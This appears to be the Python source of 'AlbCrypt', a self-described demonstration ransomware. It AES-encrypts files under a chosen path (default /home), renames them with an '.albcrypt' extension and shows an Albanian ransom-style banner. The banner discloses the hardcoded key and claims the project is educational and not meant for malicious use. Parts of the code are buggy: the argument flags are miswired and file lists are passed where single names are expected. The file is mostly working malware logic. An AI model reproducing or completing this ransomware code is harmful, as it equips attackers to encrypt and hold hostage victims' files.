import pyaes
import os
import argparse

import recon
import recon_dec
import ascii_artwork


#hardcoded key to decrypt files
hardcoded_key = "albanian submarine"


#function to encrypt found files
def encrypt_files(file_name, key):

    aes = pyaes.AESModeOfOperationCTR(key)
    with open(file_name, 'rb') as (fo):
        plaintext = fo.read()
    enc = aes.encrypt(plaintext)
    with open(file_name, 'wb') as (fo):
        fo.write(enc)
    os.rename(file_name, file_name + '.albcrypt')
    print(ascii_artwork.ascii_artwork_enc)


#function to decrypt files
def decrypt_files(file_name, key):

    aes = pyaes.AESModeOfOperationCTR(key)
    with open(file_name, 'rb') as (fo):
        plaintext = fo.read()
    dec = aes.decrypt(plaintext)
    with open(file_name, 'wb') as (fo):
        fo.write(dec)
    print(ascii_artwork.ascii_artwork_dec)


#function to parse decrypt option
def get_parser():

    parser = argparse.ArgumentParser(description='AlbCrypt')
    parser.add_argument('decrypt', help='decrypt files [default: no]',
                        action="store_true")
    parser.add_argument('-p', '--startpath', help='specify target path [default: /home]',
                        action='store_true')
    return parser


def main():
    
    parser  = get_parser()
    args    = vars(parser.parse_args())
    decrypt = args['decrypt']
    startpath = args['startpath']

    if decrypt:
        print (f'''
AlbCrypt!
---------------
FILET TUAJA JANE ENKRIPTUAR! Kjo eshte pjesa kur zakonisht kriminelet kibernetik
kerkojne nje pagese ne kriptovalute per te derguar celesin e dekriptimit ne menyre 
qe ju te rikuperoni filet tuaja. Ky eshte nje shembull i thjeshte per te treguar 
se sa e lehte eshte te ndertosh nje ransomware ne python.

Ky projekt nuk ka synim te perdoret per qellime dashakeqe. Celesi i dekriptimit
gjendet me poshte. Sigurohuni qe ta shkruani sakte celesin, ndryshe rrezikoni te 
humbisni filet tuaja pergjithmone. Mos perfshini thonjezat ne celesin e dekriptimit.
Dekriptim te mbare!

Celesi i dekriptimit eshte: {hardcoded_key}
''')
        key = input('VENDOS CELESIN KETU: ')

        if key == hardcoded_key:
            decrypt_files(recon_dec.get_files(startpath), key)
        else:
            print("Your decryption key is incorrect!")
        exit()

    else:
        if hardcoded_key:
            key = hardcoded_key
    
    if startpath:
        encrypt_files(recon.get_files(startpath), key)
    else:
        encrypt_files(recon.get_files('/home'), key)

if __name__=="__main__":
    main()